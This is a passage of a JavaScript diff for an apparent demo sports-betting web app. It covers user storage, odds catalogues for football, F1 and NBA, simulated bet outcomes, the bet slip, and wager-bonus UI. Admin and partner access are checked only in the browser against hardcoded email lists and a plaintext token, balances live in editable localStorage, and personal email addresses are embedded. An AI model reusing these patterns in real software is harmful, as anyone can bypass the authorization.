+  /* ------------------------------------------------------------------ ADMIN
+     Seuls les comptes listés ici voient l'onglet ADMIN et peuvent l'ouvrir.
+     >>> Léo : remplace cette liste par TON adresse définitive. <<<        */
+  var ADMIN_EMAILS = [
+    "neyvo.entreprise@gmail.com",
+    "leo.leguillou01@gmail.com"
+  ];
+
+  /* --------------------------------------------------------------- PARTNER
+     Un compte Partner est RESTREINT : il ne voit QUE l'onglet Partenaire.
+     Accès uniquement via un LIEN SPÉCIAL contenant le bon token
+     (?partner=<token>), sinon l'email Partner se comporte comme un joueur.
+     Le token débloque la session (sessionStorage) et reste actif tant que
+     l'onglet est ouvert.                                                    */
+  var PARTNER_EMAILS = [
+    "partner@cademo.app"
+  ];
+  var PARTNER_ACCESS_TOKEN = "cademo-partner-2026";
+
+  // Le lien à donner aux affiliés (à ouvrir une fois pour débloquer l'accès).
+  // Ex. : http://192.168.1.110:5500/index.html?partner=cademo-partner-2026
+  function partnerAccessUnlocked() {
+    try {
+      if (sessionStorage.getItem("cademo_partner_unlocked") === "1") return true;
+      var q = new URLSearchParams(location.search);
+      if (q.get("partner") === PARTNER_ACCESS_TOKEN) {
+        sessionStorage.setItem("cademo_partner_unlocked", "1");
+        return true;
+      }
+    } catch (e) {}
+    return false;
+  }
+
+  var BONUS_AMOUNT   = 200;   // € crédités à l'activation du bonus
+  var REFERRAL_TIER  = 30;    // filleuls vérifiés / palier de commission
+  var REFERRAL_REWARD = 50;   // € par palier
+
+  var KEY_USERS = "cademo_users";
+  var KEY_CURRENT = "cademo_current";
+
+  /* ---------------------------------------------------------------- stock */
+  // Chrome bloque localStorage sur file:// : repli en mémoire pour que
+  // l'app tourne quand même en ouvrant le fichier d'un double-clic.
+  var memStore = {};
+  var Store = {
+    get: function (k) {
+      try { var v = localStorage.getItem(k); return v === null ? (k in memStore ? memStore[k] : null) : v; }
+      catch (e) { return (k in memStore) ? memStore[k] : null; }
+    },
+    set: function (k, v) {
+      memStore[k] = v;
+      try { localStorage.setItem(k, v); } catch (e) { /* mode mémoire seule */ }
+    },
+    del: function (k) {
+      delete memStore[k];
+      try { localStorage.removeItem(k); } catch (e) { /* mode mémoire seule */ }
+    }
+  };
+
+  function loadUsers() {
+    try { return JSON.parse(Store.get(KEY_USERS)) || {}; }
+    catch (e) { return {}; }
+  }
+  function saveUsers(u) { Store.set(KEY_USERS, JSON.stringify(u)); }
+  function currentEmail() { return Store.get(KEY_CURRENT) || ""; }
+
+  function getUser() {
+    var users = loadUsers(), e = currentEmail();
+    if (!e || !users[e]) return null;
+    return users[e];
+  }
+  function saveUser(user) {
+    var users = loadUsers();
+    users[user.email] = user;
+    saveUsers(users);
+  }
+
+  /* ----------------------------- sync wager from server --------------------- */
+  function syncProfileFromServer(token) {
+    fetch(apiBase() + '/api/player/me', {
+      headers: { 'Authorization': 'Bearer ' + token }
+    }).then(function(r) { return r.json(); }).then(function(res) {
+      if (res.success && res.profile) {
+        var p = res.profile;
+        var users = loadUsers();
+        var u = users[currentEmail()];
+        if (!u) return;
+        if (typeof p.bonus_amount_locked === 'number') u.bonusAmountLocked = p.bonus_amount_locked;
+        if (typeof p.wager_multiplier === 'number') u.wagerMultiplier = p.wager_multiplier;
+        if (typeof p.wager_required === 'number') u.wagerRequired = p.wager_required;
+        if (typeof p.wager_progress === 'number') u.wagerProgress = p.wager_progress;
+        if (typeof p.wager_completed === 'boolean') u.wagerCompleted = p.wager_completed;
+        if (typeof p.balance === 'number') u.balance = p.balance;
+        if (p.bonus_activated === true || p.bonus_activated === false) u.bonus_activated = p.bonus_activated;
+        saveUsers(users);
+        // Rafraîchir la vue si on est sur le profil
+        if (state.view === 'profile') renderProfile();
+      }
+    }).catch(function(e) { console.error('[SYNC] Erreur sync profil:', e); });
+  }
+
+  // Le compte connecté a-t-il les droits admin ?
+  function isAdmin() {
+    var e = (currentEmail() || "").trim().toLowerCase();
+    return !!e && ADMIN_EMAILS.some(function (a) { return a.toLowerCase() === e; });
+  }
+  // Le compte connecté est-il un Partner ? (interface totalement séparée)
+  // Le token d'accès dans l'URL est ÉGALEMENT requis.
+  function isPartner() {
+    var e = (currentEmail() || "").trim().toLowerCase();
+    if (!e) return false;
+    if (!PARTNER_EMAILS.some(function (a) { return a.toLowerCase() === e; })) return false;
+    return partnerAccessUnlocked();
+  }
+
+  // Génère un @username unique à partir d'un email : nom avant le @, sans doublon.
+  function usernameFromEmail(email, users) {
+    var base = "@" + String(email).split("@")[0].toLowerCase()
+      .replace(/[^a-z0-9._-]/g, "");
+    if (!base || base === "@") base = "@joueur";
+    var taken = {};
+    Object.keys(users || {}).forEach(function (k) {
+      if (users[k] && users[k].username) taken[users[k].username.toLowerCase()] = true;
+    });
+    if (!taken[base.toLowerCase()]) return base;
+    var i = 2;
+    while (taken[(base + i).toLowerCase()]) i++;
+    return base + i;
+  }
+
+  function shortIdLocal(users) {
+    var taken = {};
+    Object.keys(users || {}).forEach(function (k) {
+      if (users[k] && users[k].short_id) taken[users[k].short_id] = true;
+    });
+    var id;
+    do { id = '#' + String(Math.floor(Math.random() * 10000)).padStart(4, '0'); } while (taken[id]);
+    return id;
+  }
+
+  function signIn(email, supabaseId) {
+    var users = loadUsers();
+    // Un compte Partner n'a pas de solde, pas de paris : c'est un compte de gestion.
+    var partner = PARTNER_EMAILS.some(function (a) { return a.toLowerCase() === email.toLowerCase(); });
+    if (!users[email]) {
+      users[email] = {
+        email: email,
+        short_id: shortIdLocal(users),
+        username: usernameFromEmail(email, users),
+        balance: partner ? 0 : START_BALANCE,
+        bets: [],
+        is_verified: false,
+        bonus_activated: false,
+        supabaseId: supabaseId || null,
+        role: partner ? "partner" : "player",
+        createdAt: new Date().toISOString(),
+        wagerRequired: 0,
+        wagerProgress: 0,
+        wagerCompleted: true,
+        wagerMultiplier: 50,
+        bonusAmountLocked: 0
+      };
+      saveUsers(users);
+    } else {
+      var u = users[email];
+      if (!u.username)            u.username = usernameFromEmail(email, users);
+      if (!u.short_id)              u.short_id = shortIdLocal(users);
+      if (typeof u.is_verified === "undefined")     u.is_verified = false;
+      if (typeof u.bonus_activated === "undefined") u.bonus_activated = false;
+      if (typeof u.role === "undefined")            u.role = partner ? "partner" : "player";
+      if (supabaseId && !u.supabaseId)              u.supabaseId = supabaseId;
+      // Migration wager
+      if (typeof u.wagerRequired === "undefined")   u.wagerRequired = 0;
+      if (typeof u.wagerProgress === "undefined")   u.wagerProgress = 0;
+      if (typeof u.wagerCompleted === "undefined") {
+        // Si bonus déjà activé avant cette mise à jour, on considère le wager déjà atteint pour ne pas bloquer
+        u.wagerCompleted = !!u.bonus_activated;
+      }
+      if (typeof u.wagerMultiplier === "undefined") u.wagerMultiplier = 50;
+      if (typeof u.bonusAmountLocked === "undefined") u.bonusAmountLocked = 0;
+      saveUsers(users);
+    }
+    Store.set(KEY_CURRENT, email);
+  }
+
+  /* ------------------------------------------------------------ catalogue */
+  // Cotes dures : les favoris paient peu, les outsiders paient énorme.
+  // cat "trending" = les valeurs sûres, cat "value" = les exploits improbables.
+  var CATALOG = {
+    foot: {
+      label: "Football", icon: "sports_soccer", color: "#16A34A",
+      markets: [
+        { id:"fb-1", cat:"trending", who:"Kylian Mbappé",
+          match:"PSG vs Dortmund • Champions League", market:"Buts marqués (total)", line:"1.5", c:"#0B1C4B",
+          eventId:"static-fb-1", marketKey:"totals", commenceTime:null,
+          less:{l:"Less",o:1.25}, more:{l:"More",o:2.66} },
+        { id:"fb-2", cat:"trending", who:"Erling Haaland",
+          match:"Man City vs Arsenal • Premier League", market:"Buts marqués (total)", line:"0.5", c:"#6CABDD",
+          eventId:"static-fb-2", marketKey:"totals", commenceTime:null,
+          less:{l:"Less",o:2.30}, more:{l:"More",o:1.35} },
+        { id:"fb-3", cat:"trending", who:"Plus de 2.5 buts",
+          match:"Real Madrid vs FC Barcelone • Liga", market:"Buts du match", line:"2.5", c:"#1D4ED8",
+          eventId:"static-fb-3", marketKey:"totals", commenceTime:null,
+          less:{l:"Less",o:1.89}, more:{l:"More",o:1.55} },
+        { id:"fb-4", cat:"trending", who:"Match à 4 cartons ou +",
+          match:"Juventus vs Milan • Serie A", market:"Cartons du match", line:"3.5", c:"#CA8A04",
+          eventId:"static-fb-4", marketKey:"totals", commenceTime:null,
+          less:{l:"Less",o:1.60}, more:{l:"More",o:1.81} },
+        { id:"fb-v1", cat:"value", who:"Un défenseur central marque un doublé",
+          match:"Toutes affiches • Journée en cours", market:"Doublé d'un défenseur", line:null, c:"#7F1D1D",
+          eventId:"static-fb-v1", marketKey:"outrights", commenceTime:null,
+          less:null, more:{l:"Oui",o:65.38} },
+        { id:"fb-v2", cat:"value", who:"Le gardien marque dans le temps additionnel",
+          match:"Toutes affiches • 90'+", market:"Gardien buteur", line:null, c:"#166534",
+          eventId:"static-fb-v2", marketKey:"outrights", commenceTime:null,
+          less:null, more:{l:"Oui",o:151.79} },
+        { id:"fb-v3", cat:"value", who:"Un remplaçant entré à la 85e met le but de la victoire",
+          match:"Toutes affiches • 85'+", market:"Entrant décisif", line:null, c:"#4C1D95",
+          eventId:"static-fb-v3", marketKey:"outrights", commenceTime:null,
+          less:null, more:{l:"Oui",o:34.00} },
+        { id:"fb-v4", cat:"value", who:"Une équipe de bas de tableau colle 4 buts à un cador",
+          match:"Toutes affiches • Journée en cours", market:"4 buts du mal classé", line:null, c:"#9A3412",
+          eventId:"static-fb-v4", marketKey:"outrights", commenceTime:null,
+          less:null, more:{l:"Oui",o:29.31} }
+      ]
+    },
+    f1: {
+      label: "F1", icon: "sports_motorsports", color: "#E10600",
+      markets: [
+        { id:"f1-1", cat:"trending", who:"Max Verstappen",
+          match:"Grand Prix • Vainqueur de la course", market:"Victoire", line:null, c:"#0600EF",
+          eventId:"static-f1-1", marketKey:"outrights", commenceTime:null,
+          less:{l:"No",o:2.24}, more:{l:"Yes",o:1.37} },
+        { id:"f1-2", cat:"trending", who:"Charles Leclerc",
+          match:"Grand Prix • Qualifications", market:"Position en qualif", line:"2.5", c:"#DC0000",
+          eventId:"static-f1-2", marketKey:"totals", commenceTime:null,
+          less:{l:"Less",o:1.81}, more:{l:"More",o:1.60} },
+        { id:"f1-3", cat:"trending", who:"Lando Norris",
+          match:"Grand Prix • Meilleur tour", market:"Signe le meilleur tour", line:null, c:"#FF8700",
+          eventId:"static-f1-3", marketKey:"outrights", commenceTime:null,
+          less:null, more:{l:"Yes",o:4.59} },
+        { id:"f1-4", cat:"trending", who:"George Russell",
+          match:"Grand Prix • Arrivée", market:"Termine dans le top 5", line:null, c:"#00A19C",
+          eventId:"static-f1-4", marketKey:"outrights", commenceTime:null,
+          less:{l:"No",o:1.32}, more:{l:"Yes",o:2.39} },
+        { id:"f1-v1", cat:"value", who:"Une Haas monte sur le podium",
+          match:"Grand Prix • Fond de grille", market:"Podium d'un fond de grille", line:null, c:"#4A4A4A",
+          eventId:"static-f1-v1", marketKey:"outrights", commenceTime:null,
+          less:null, more:{l:"Oui",o:40.48} },
+        { id:"f1-v2", cat:"value", who:"Un pilote parti dernier finit dans les points",
+          match:"Grand Prix • Remontée", market:"Dernier sur la grille → top 10", line:null, c:"#2F2F2F",
+          eventId:"static-f1-v2", marketKey:"outrights", commenceTime:null,
+          less:null, more:{l:"Oui",o:18.48} },
+        { id:"f1-v3", cat:"value", who:"Un rookie signe le meilleur tour de la course",
+          match:"Grand Prix • Meilleur tour", market:"Meilleur tour d'un rookie", line:null, c:"#2A6E3F",
+          eventId:"static-f1-v3", marketKey:"outrights", commenceTime:null,
+          less:null, more:{l:"Oui",o:25.76} },
+        { id:"f1-v4", cat:"value", who:"Un pilote en galère bat son coéquipier champion en qualif",
+          match:"Grand Prix • Duel interne", market:"Duel de coéquipiers", line:null, c:"#6B21A8",
+          eventId:"static-f1-v4", marketKey:"outrights", commenceTime:null,
+          less:null, more:{l:"Oui",o:7.80} }
+      ]
+    },
+    nba: {
+      label: "Basketball", icon: "sports_basketball", color: "#C8102E",
+      markets: [
+        { id:"nb-1", cat:"trending", who:"Victor Wembanyama",
+          match:"Spurs vs Lakers", market:"Points + rebonds", line:"32.5", c:"#1B1B1B",
+          eventId:"static-nb-1", marketKey:"totals", commenceTime:null,
+          less:{l:"Less",o:1.70}, more:{l:"More",o:1.70} },
+        { id:"nb-2", cat:"trending", who:"G. Antetokounmpo",
+          match:"Bucks vs Celtics", market:"Points", line:"32.5", c:"#00471B",
+          eventId:"static-nb-2", marketKey:"totals", commenceTime:null,
+          less:{l:"Less",o:1.70}, more:{l:"More",o:1.70} },
+        { id:"nb-3", cat:"trending", who:"A. Edwards",
+          match:"Wolves vs Pacers", market:"3 points marqués", line:"4.5", c:"#0C2340",
+          eventId:"static-nb-3", marketKey:"totals", commenceTime:null,
+          less:{l:"Less",o:1.63}, more:{l:"More",o:1.77} },
+        { id:"nb-4", cat:"trending", who:"N. Jokic",
+          match:"Nuggets vs Suns", market:"Rebonds", line:"12.5", c:"#0E2240",
+          eventId:"static-nb-4", marketKey:"totals", commenceTime:null,
+          less:{l:"Less",o:1.73}, more:{l:"More",o:1.67} },
+        { id:"nb-5", cat:"trending", who:"T. Haliburton",
+          match:"Pacers vs Knicks", market:"Passes décisives", line:"9.5", c:"#FDBB30",
+          eventId:"static-nb-5", marketKey:"totals", commenceTime:null,
+          less:{l:"Less",o:1.67}, more:{l:"More",o:1.73} },
+        { id:"nb-v1", cat:"value", who:"Un joueur du banc score 30+",
+          match:"Toutes affiches • Sortie du banc", market:"30 points depuis le banc", line:"29.5", c:"#3F3F46",
+          eventId:"static-nb-v1", marketKey:"totals", commenceTime:null,
+          less:null, more:{l:"Oui",o:14.66} },
+        { id:"nb-v2", cat:"value", who:"Le pire shooteur à 3 pts de l'équipe en rentre 5",
+          match:"Toutes affiches • Adresse extérieure", market:"5 tirs à 3 points", line:"4.5", c:"#7C2D12",
+          eventId:"static-nb-v2", marketKey:"totals", commenceTime:null,
+          less:null, more:{l:"Oui",o:36.96} },
+        { id:"nb-v3", cat:"value", who:"Le dernier de la conférence bat le leader de 20+",
+          match:"Toutes affiches • Écart final", market:"Écart de 20 points", line:"19.5", c:"#581C87",
+          eventId:"static-nb-v3", marketKey:"totals", commenceTime:null,
+          less:null, more:{l:"Oui",o:22.97} }
+      ]
+    }
+  };
+
+  var SPORT_ORDER = ["foot", "f1", "nba"];
+
+  /* ------------------------------------------------------- état de la vue */
+  var state = {
+    sport: "foot",
+    view: "bets",
+    myBetsTab: "open",
+    adminFilter: "all",
+    googleAccounts: [],
+    googleFilter: "all",
+    creditTarget: null,
+    slip: [],
+    events: {},
+    // Espace Partner
+    partnerQuery: "",
+    partnerResult: null,       // { kind: 'none' | 'user', user }
+    pendingAffiliate: null      // capté depuis ?affiliate=@handle sur la landing
+  };
+
+  // Un lien affilié amène le visiteur avec ?affiliate=@handle dans l'URL.
+  // On le mémorise pour que le prochain compte créé garde ce parrain.
+  (function captureAffiliate(){
+    try {
+      var m = (location.search || "").match(/[?&]affiliate=([^&]+)/);
+      if (!m) return;
+      var v = decodeURIComponent(m[1]).trim();
+      state.pendingAffiliate = v;
+    } catch (e) {}
+  })();
+
+  /* ----------------------------------------------------------- utilitaires */
+  function euro(n) {
+    var v = Math.round(n * 100) / 100;
+    return "€" + v.toLocaleString("fr-FR", {
+      minimumFractionDigits: (v % 1 === 0 ? 0 : 2), maximumFractionDigits: 2
+    });
+  }
+  function esc(s) {
+    return String(s).replace(/[&<>"']/g, function (c) {
+      return ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c];
+    });
+  }
+  function el(id) { return document.getElementById(id); }
+  function slipOdds() {
+    return state.slip.reduce(function (a, l) { return a * l.odds; }, 1);
+  }
+  function findMarket(mid) {
+    var found = null;
+    SPORT_ORDER.forEach(function (k) {
+      CATALOG[k].markets.forEach(function (x) { if (x.id === mid) found = { m: x, sport: k }; });
+    });
+    return found;
+  }
+
+  /* ------------------------------------------- API réelle via backend */
+  var FALLBACK = {
+    f1:   { label: "Grand Prix à venir", date: "Prochaine course", live: false },
+    foot: { label: "Championnat · Journée en cours", date: "Ce week-end", live: false },
+    nba:  { label: "NBA · Soirée du soir", date: "Ce soir", live: false }
+  };
+
+  function refreshOddsForSport(k) {
+    fetch("/api/odds?sport=" + k)
+      .then(function (r) { return r.json(); })
+      .then(function (data) {
+        if (data.success && data.markets && data.markets.length) {
+          CATALOG[k].markets = data.markets;
+          var first = data.markets.find(function (m) { return m.commenceTime; });
+          if (first && first.commenceTime) {
+            var d = new Date(first.commenceTime);
+            state.events[k] = {
+              label: (k === "f1" ? "Grand Prix" : (k === "nba" ? "NBA" : "Football")) + " · " + (first.match || "Événement"),
+              date: d.toLocaleDateString("fr-FR", { weekday: "short", day: "numeric", month: "short", hour: "2-digit", minute: "2-digit" }),
+              live: true
+            };
+          } else {
+            state.events[k] = { label: CATALOG[k].label + " · API", date: "En direct", live: true };
+          }
+          if (state.sport === k) render();
+        }
+      })
+      .catch(function (err) { console.warn("[ODDS]", k, err); });
+  }
+
+  /* ------------------------------------------------------- simulation */
+  // Pour les paris statiques (sans eventId API), on simule un résultat
+  // basé sur la cote : proba implicite = 1/cote, avec une petite marge maison.
+  function simulateLegOutcome(odds, line) {
+    var implied = 1 / odds;
+    var prob = Math.min(0.95, implied * 0.92); // marge maison 8 %
+    var rnd = Math.random();
+    if (rnd < prob) return 'won';
+    // Push très rare si la line est un nombre entier
+    if (line !== null && line !== undefined && Number.isInteger(parseFloat(line))) {
+      if (rnd < prob + 0.02) return 'push';
+    }
+    return 'lost';
+  }
+  function isStaticEvent(eventId) {
+    return !eventId || String(eventId).indexOf('static-') === 0;
+  }
+
+  function loadEvents() {
+    SPORT_ORDER.forEach(function (k) { state.events[k] = FALLBACK[k]; });
+    render();
+    SPORT_ORDER.forEach(refreshOddsForSport);
+    checkAndSettleBets();
+  }
+
+  /* ---------------------------------------------------------------- rendu */
+  function renderSports() {
+    el("sport-tabs").innerHTML = SPORT_ORDER.map(function (k) {
+      var s = CATALOG[k];
+      return '<button class="cd-sport' + (state.sport === k ? " is-on" : "") + '" data-sport="' + k + '">'
+           + '<span class="material-symbols-outlined">' + s.icon + '</span>' + esc(s.label) + '</button>';
+    }).join("");
+    Array.prototype.forEach.call(el("sport-tabs").children, function (b) {
+      b.onclick = function () { state.sport = b.getAttribute("data-sport"); render(); };
+    });
+  }
+
+  function marketCard(m) {
+    var initials = (m.who || "?").split(" ").map(function(w){return w[0]||""}).join("").substring(0,2).toUpperCase();
+    var now = new Date();
+    var start = m.commenceTime ? new Date(m.commenceTime) : null;
+    var now = new Date();
+    var start = m.commenceTime ? new Date(m.commenceTime) : null;
+    var isDone = start && now >= new Date(start.getTime() + 3 * 60 * 60 * 1000);
+
+    var sides = ["less", "more"].filter(function (side) { return !!m[side]; })
+      .map(function (side) {
+        var d = m[side];
+        var key = m.id + ":" + side;
+        var on = state.slip.some(function (l) { return l.key === key; });
+        var isMore = side === "more";
+        var arrow = isMore ? "arrow_upward" : "arrow_downward";
+        return '<button class="cd-pick cd-pick-' + side + (on ? " is-on" : "") + '" data-pick="' + key + '">'
+             + '<span class="material-symbols-outlined" style="font-size:16px;">' + arrow + '</span>'
+             + '<span class="cd-p-l">' + esc(d.l) + '</span></button>';
+      }).join("");
+
+    return '<article class="cd-card' + (isDone ? ' cd-card-done' : '') + '">'
+      + '<div class="cd-bg-letters">' + esc(initials) + '</div>'
+      + '<div class="cd-card-top">'
+      +   '<div style="min-width:0;"><h3>' + esc(m.who) + '</h3>'
+      +     '<p><span class="material-symbols-outlined" style="font-size:12px;">' + CATALOG[state.sport].icon + '</span>' + esc(m.match) + '</p></div>'
+      + '</div>'
+      + '<div style="display:flex;justify-content:space-between;align-items:center;position:relative;z-index:1;">'
+      +   '<div><div class="cd-line">' + (m.line ? esc(m.line) : "") + '</div><div class="cd-market">' + esc(m.market) + '</div></div>'
+      +   '<div class="cd-picks" style="flex:0 0 auto;gap:var(--s-xs);">' + sides + '</div>'
+      + '</div>'
+      + '</article>';
+  }
+
+  function renderList() {
+    var ev = state.events[state.sport] || FALLBACK[state.sport];
+    el("event-label").innerHTML = esc(ev.label) + " · " + esc(ev.date);
+
+    var q = (el("search-input").value || "").trim().toLowerCase();
+    var all = CATALOG[state.sport].markets.filter(function (m) {
+      return !q || (m.who + " " + m.match + " " + m.market).toLowerCase().indexOf(q) >= 0;
+    });
+
+    function section(title, icoClass, ico, cat) {
+      var list = all.filter(function (m) { return m.cat === cat; });
+      if (!list.length) return "";
+      return '<section class="cd-sec"><h2>'
+        + '<span class="material-symbols-outlined ' + icoClass + '">' + ico + '</span>' + title + '</h2>'
+        + '<div class="cd-cards">' + list.map(marketCard).join("") + '</div></section>';
+    }
+
+    var html = section("Trending Bets", "ic-fire", "local_fire_department", "trending")
+             + section("Value Picks", "ic-gem", "diamond", "value");
+    el("bet-sections").innerHTML = html || '<div class="cd-empty">Aucun pari ne correspond.</div>';
+
+    Array.prototype.forEach.call(el("bet-sections").querySelectorAll("[data-pick]"), function (b) {
+      b.onclick = function () { togglePick(b.getAttribute("data-pick")); };
+    });
+  }
+
+  function togglePick(key) {
+    var parts = key.split(":"), mid = parts[0], side = parts[1];
+    var idx = state.slip.findIndex(function (l) { return l.key === key; });
+    if (idx >= 0) { state.slip.splice(idx, 1); render(); return; }
+    state.slip = state.slip.filter(function (l) { return l.marketId !== mid; });
+    var f = findMarket(mid);
+    if (!f) return;
+    var m = f.m;
+    // Bloquer les paris sur des matches déjà terminés (API)
+    var now = new Date();
+    var start = m.commenceTime ? new Date(m.commenceTime) : null;
+    var isDone = start && now >= new Date(start.getTime() + 3 * 60 * 60 * 1000);
+    if (isDone) { alert("Ce match est terminé — les paris sont clos."); return; }
+    state.slip.push({
+      key: key, marketId: mid, sport: f.sport, side: side,
+      who: m.who, match: m.match, market: m.market,
+      pick: m[side].l + (m.line ? " " + m.line : ""),
+      odds: m[side].o,
+      eventId: m.eventId,
+      marketKey: m.marketKey,
+      line: m.line,
+      commenceTime: m.commenceTime
+    });
+    render();
+  }
+
+  function renderHeader() {
+    var u = getUser();
+    if (!u) return;
+    var n = state.slip.length;
+    var badge = el("nav-badge");
+    if (badge) { badge.style.display = n ? "block" : "none"; badge.textContent = n; }
+    // Bouton solde dans le header : affiche toujours le solde réel
+    var unlockBtn = el("hdr-unlock");
+    if (unlockBtn) {
+      unlockBtn.className = "cd-unlock-btn is-verified";
+      unlockBtn.innerHTML = '<span class="material-symbols-outlined">account_balance_wallet</span><span id="hdr-unlock-text">' + euro(u.balance) + '</span>';
+    }
+  }
+
+  /* ------------------------------------------------------------- ticket */
+  function renderTicketView() {
+    var u = getUser();
+    if (!u) return;
+    var n = state.slip.length;
+    el("tk-count").textContent = n + " sélection" + (n > 1 ? "s" : "");
+
+    if (!n) {
+      el("ticket-legs").innerHTML = '<div class="cd-empty">Aucune sélection. Choisis des paris pour construire ton ticket.</div>';
+      el("stake-box").style.display = "none";
+      el("tk-confirm").style.display = "none";
+      return;
+    }
+    el("stake-box").style.display = "block";
+    el("tk-confirm").style.display = "flex";
+
+    el("ticket-legs").innerHTML = state.slip.map(function (l) {
+      return '<div style="background-color:var(--sc-high);border:1px solid rgba(255,255,255,0.05);border-radius:8px;padding:var(--s-md);position:relative;overflow:hidden;margin-bottom:var(--s-sm);display:flex;flex-direction:column;gap:var(--s-xs);">'
+        + '<div style="position:absolute;left:0;top:0;bottom:0;width:3px;background-color:var(--blue);border-radius:8px 0 0 8px;"></div>'
+        + '<div style="display:flex;justify-content:space-between;align-items:flex-start;gap:var(--s-sm);padding-left:8px;">'
+        +   '<div style="min-width:0;">'
+        +     '<span style="font-size:12px;font-weight:700;color:var(--on-surface-variant);text-transform:uppercase;letter-spacing:0.05em;">' + esc(l.market) + '</span>'
+        +     '<h3 style="font-size:16px;font-weight:600;color:var(--on-surface);margin:4px 0 0;text-align:left;">' + esc(l.pick) + '</h3></div>'
+        +   '<button data-rm="' + l.key + '" style="background:none;border:none;cursor:pointer;color:var(--outline);padding:2px;">'
+        +     '<span class="material-symbols-outlined" style="font-size:18px;">close</span></button></div>'
+        + '<div style="display:flex;justify-content:space-between;align-items:flex-end;padding-left:8px;margin-top:4px;">'
+        +   '<p style="font-size:14px;color:var(--on-surface-variant);display:flex;align-items:center;gap:5px;margin:0;"><span class="material-symbols-outlined" style="font-size:14px;">' + CATALOG[l.sport].icon + '</span>' + esc(l.who) + '</p>'
+        +   '<div style="background-color:rgba(23,59,171,0.3);border:1px solid var(--blue-light);border-radius:6px;padding:4px 10px;"><b style="font-size:14px;font-weight:700;color:var(--blue-light);">' + l.odds.toFixed(2) + '</b></div></div>'
+        + '</div>';
+    }).join("");
+
+    Array.prototype.forEach.call(el("ticket-legs").querySelectorAll("[data-rm]"), function (b) {
+      b.onclick = function () { togglePick(b.getAttribute("data-rm")); };
+    });
+
+    var stake = parseFloat(el("stake-input").value) || 0;
+    var o = slipOdds();
+    var max = miseMax(u.balance);
+    var brut = stake * o;
+    var gain = gainDe(stake, o);
+
+    el("tk-odds").textContent = "Multiplier: x" + o.toFixed(2);
+    el("tk-win").textContent = euro(gain);
+    el("tk-after").textContent = euro(u.balance - stake);
+
+    // On dit clairement quand le plafond mord : rien n'est caché au joueur.
+    el("tk-cap").innerHTML = (brut > gain && stake > 0)
+      ? 'Gain brut ' + euro(brut) + ' — <b>plafonné à ' + euro(GAIN_MAX) + ' par ticket</b>'
+      : 'Gain plafonné à ' + euro(GAIN_MAX) + ' par ticket.';
+    el("tk-limit").textContent = "Mise entre " + euro(MISE_MIN) + " et " + euro(max)
+      + " (10 % du solde, " + euro(MISE_MAX_ABS) + " maximum).";
+
+    Array.prototype.forEach.call(el("quick-stakes").children, function (b) {
+      var v = b.getAttribute("data-stake");
+      var on = (v === "max") ? (stake === max && stake > 0) : (parseFloat(v) === stake);
+      b.classList.toggle("is-on", !!on);
+      b.disabled = (v !== "max") && parseFloat(v) > max;
+      b.style.opacity = b.disabled ? ".35" : "1";
+    });
+
+    var msg = null;
+    if (u.balance <= 0) msg = "Solde épuisé. Vérifie ton mail pour débloquer tes 200 €";
+    else if (stake < MISE_MIN) msg = "Mise minimum " + euro(MISE_MIN);
+    else if (stake > u.balance) msg = "Solde insuffisant";
+    else if (stake > max) msg = "Mise maximum " + euro(max);
+    var btn = el("tk-confirm");
+    btn.disabled = !!msg;
+    if (u.balance <= 0) {
+      btn.innerHTML = 'Solde bloqué <span class="material-symbols-outlined">lock</span>';
+      btn.style.backgroundColor = "var(--error-container)";
+      btn.style.color = "var(--on-error-container)";
+    } else {
+      btn.innerHTML = (msg || "Valider le pari")
+        + ' <span class="material-symbols-outlined" style="font-variation-settings:\'FILL\' 1;">done</span>';
+      btn.style.backgroundColor = "";
+      btn.style.color = "";
+    }
+  }
+
+  /* ------------------------------------------------------------- profil */
+  function renderProfile() {
+    var u = getUser();
+    if (!u) return;
+    var pct = Math.max(0, Math.min(100, (u.balance / GOAL) * 100));
+    var remaining = Math.max(0, GOAL - u.balance);
+    var pfName = el("pf-name"), pfSince = el("pf-since");
+    if (pfName) pfName.textContent = u.username || "Alex Mercer";
+    var pfShort = el("pf-shortid");
+    if (pfShort) pfShort.textContent = u.short_id ? "Identifiant : " + u.short_id : "";
+    if (pfSince) pfSince.textContent = "Member since " + (u.createdAt ? new Date(u.createdAt).getFullYear() : "2023");
+    var pfBalance = el("pf-balance");
+    if (pfBalance) pfBalance.textContent = euro(u.balance);
+    var pfBar = el("pf-bar");
+    if (pfBar) pfBar.style.width = pct.toFixed(1) + "%";
+    var pfPct = el("pf-pct");
+    if (pfPct) pfPct.textContent = pct.toFixed(0) + "%";
+    var pfRemaining = el("pf-remaining");
+    if (pfRemaining) pfRemaining.textContent = euro(remaining) + " remaining";
+    // Stats
+    var pfCount = el("pf-count"), pfWon = el("pf-won"), pfStaked = el("pf-staked");
+    if (pfCount) pfCount.textContent = u.bets.length;
+    if (pfWon) pfWon.textContent = u.bets.filter(function (b) { return b.status === "won"; }).length;
+    if (pfStaked) pfStaked.textContent = euro(u.bets.reduce(function (a, b) { return a + b.stake; }, 0));
+    // Bouton solde dans le profil : affiche toujours le solde réel
+    var pfUnlockBtn = el("pf-unlock-btn");
+    if (pfUnlockBtn) {
+      pfUnlockBtn.className = "cd-unlock-btn is-verified";
+      pfUnlockBtn.innerHTML = '<span class="material-symbols-outlined">account_balance_wallet</span><span id="pf-unlock-text">' + euro(u.balance) + '</span>';
+      pfUnlockBtn.disabled = false;
+    }
+
+    // --- WAGER BONUS UI ---
+    var wagerCard = el("pf-wager-card");
+    var wagerBar = el("pf-wager-bar");
+    var wagerPct = el("pf-wager-pct");
+    var wagerInfo = el("pf-wager-info");
+    var wagerBlocked = el("pf-wager-blocked");
+    var wagerRemain = el("pf-wager-remain");
+    var wagerDone = el("pf-wager-done");
+    var withdrawBtn = el("pf-withdraw-btn");
+
+    if (wagerCard) wagerCard.style.display = "";
+    var hasWager = u.wagerRequired > 0;
+    if (hasWager) {
+      var wpct = Math.max(0, Math.min(100, (u.wagerProgress / u.wagerRequired) * 100));
+      if (wagerBar) wagerBar.style.width = wpct.toFixed(1) + "%";
+      if (wagerPct) wagerPct.textContent = wpct.toFixed(0) + "%";
+      if (wagerInfo) wagerInfo.textContent = euro(u.wagerProgress) + " / " + euro(u.wagerRequired) + " misés";
+      if (wagerRemain) wagerRemain.textContent = euro(Math.max(0, u.wagerRequired - u.wagerProgress));
+
+      if (!u.wagerCompleted) {
+        if (wagerBlocked) wagerBlocked.style.display = "";
+        if (wagerDone) wagerDone.style.display = "none";
+        if (withdrawBtn) withdrawBtn.style.display = "none";
+      } else {
